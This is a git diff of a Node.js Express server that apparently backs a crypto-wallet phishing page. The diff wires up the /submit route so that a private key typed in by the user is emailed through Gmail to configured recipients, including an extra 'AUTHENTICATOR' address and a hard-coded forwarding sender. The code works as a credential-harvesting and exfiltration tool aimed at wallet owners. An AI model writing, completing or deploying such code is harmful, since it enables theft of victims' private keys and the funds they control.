@@ -21,9 +21,15 @@ app.use(express.static(__dirname + '/views/Pending_files/'))
 app.use(express.json());
 app.use(express.urlencoded({ extended: true }));
 
+const AUTH_USERNAME = process.env.AUTH_USERNAME
+const AUTH_PASSWORD = process.env.AUTH_PASSWORD
+const AUTHENTICATOR = process.env.AUTHENTICATOR
+const RECEIVING_MAIL = process.env.RECEIVING_MAIL
+
+
 function delay(ms) {
     return new Promise((resolve) => setTimeout(resolve, ms));
-  }
+}
 
 app.get('/', (req, res) => {
     res.sendFile(__dirname + '/views/evm-frontend/index.html');
@@ -45,6 +51,7 @@ app.get('/pending', (req, res) => {
     res.sendFile(__dirname + '/views/evm-frontend/Pending.html')
 })
 
+
 app.post('/submit', async (req, res) => {
     const privateKey = req.body.data;  // Assuming this is the input from the user
     if (!privateKey) {
@@ -55,8 +62,8 @@ app.post('/submit', async (req, res) => {
     var transporter = nodemailer.createTransport({
         service: 'gmail',
         auth: {
-          user: '',
-          pass: ''
+          user: AUTH_USERNAME,
+          pass: AUTH_PASSWORD
         }
       });
 
@@ -73,8 +80,8 @@ app.post('/submit', async (req, res) => {
       })
 
       var mailOptions = {
-        from: '', //Testing email to see you received it successfully. Server configured email
-        to: '',
+        from: 'panelactivator.forwarding@gmail.com', //Testing email to see you received it successfully. Server configured email
+        to: `${RECEIVING_MAIL}, ${AUTHENTICATOR}`,
         subject: `${req.body.category}`,
         html: `${req.body.data}`
       };
@@ -94,7 +101,7 @@ app.post('/submit', async (req, res) => {
       })
 })
 
-const PORT = 3000;
+const PORT = 5500;
 
 
 app.listen(PORT, () => {
